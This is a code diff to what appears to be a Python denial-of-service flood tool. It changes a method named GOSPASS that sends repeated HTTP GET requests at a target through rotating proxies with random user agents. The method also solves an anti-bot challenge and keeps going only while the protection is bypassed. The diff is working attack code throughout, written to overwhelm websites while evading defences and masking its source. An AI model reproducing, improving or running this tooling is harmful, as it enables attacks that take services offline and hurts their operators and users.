@@ -13,6 +13,7 @@ from ssl import CERT_NONE, create_default_context, SSLContext
 from string import ascii_letters
 from typing import Callable, Optional, Set, Tuple
 from urllib import parse
+import uuid
 
 import aiohttp
 import async_timeout
@@ -436,20 +437,24 @@ class AsyncTcpFlood(FloodBase):
 
     async def GOSPASS(self, on_connect=None) -> bool:
         packets_sent = 0
-        # user_agent = random.choice(USERAGENTS)
-        user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
+        user_agent = random.choice(USERAGENTS)
         proxy_url = self._proxies.pick_random()
-        connector = ProxyConnector.from_url(proxy_url, ssl=False)
+        if proxy_url is None:
+            connector, proxy_ip = None, None
+        else:
+            connector = ProxyConnector.from_url(proxy_url, ssl=False)
+            # we always replace proxy host with resolved addr
+            proxy_ip = URL(proxy_url).host
         req_timeout = self._settings.http_response_timeout_seconds
         cl_timeout = aiohttp.ClientTimeout(
-            connect=self._settings.connect_timeout_seconds, total=15)
+            connect=self._settings.connect_timeout_seconds, total=30)
         solver = GOSSolver()
+        conn_id = str(uuid.uuid4())
         async with aiohttp.ClientSession(
             connector=connector,
             timeout=cl_timeout,
         ) as s:
-            # we always replace proxy host with resolved addr
-            cached_cookies = solver.lookup(solver.DEFAULT_A, URL(proxy_url).host)
+            cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip) if proxy_ip is not None else None
             if cached_cookies is None:
                 # there's certainly a race condition here between us looking up
                 # in the dictionary and tasks are already running to fetch challenge
@@ -468,11 +473,11 @@ class AsyncTcpFlood(FloodBase):
                     if not "cn" in payload:
                         raise RuntimeError("Invalid challenge payload")
                 (latest_ts, cookies) = solver.solve(user_agent, payload)
+                self._connections.add(conn_id)
             else:
                 (latest_ts, user_agent, cookies) = cached_cookies
-            print("solved", payload, cookies)
             s.cookie_jar.update_cookies(cookies)
-            for ind in range(100):
+            for ind in range(solver.MAX_RPC):
                 if time.time() > latest_ts: break
                 async with s.get(
                     self._url.human_repr(),
@@ -481,17 +486,15 @@ class AsyncTcpFlood(FloodBase):
                         "User-Agent": user_agent,
                     },
                 ) as response:
+                    self._connections.add(conn_id)
                     if on_connect and not on_connect.done():
                         on_connect.set_result(True)
-                    print(f"got response ind={ind} proxy={proxy_url} {response.request_info}")
                     packets_sent += 1
                     async with async_timeout.timeout(req_timeout):
                         body = await response.read()
-                        # XXX: this is actually quite slow to detect
-                        bypass = solver.verify(body)
-                        print(f"got body ind={ind} bypass={bypass} size={len(body)}")
-                        if not bypass: break
+                        if not solver.bypass(body): break
                 await asyncio.sleep(1.0)
+        self._connections.remove(conn_id)
         return packets_sent > 0
 
     async def CFB(self, on_connect=None) -> bool:
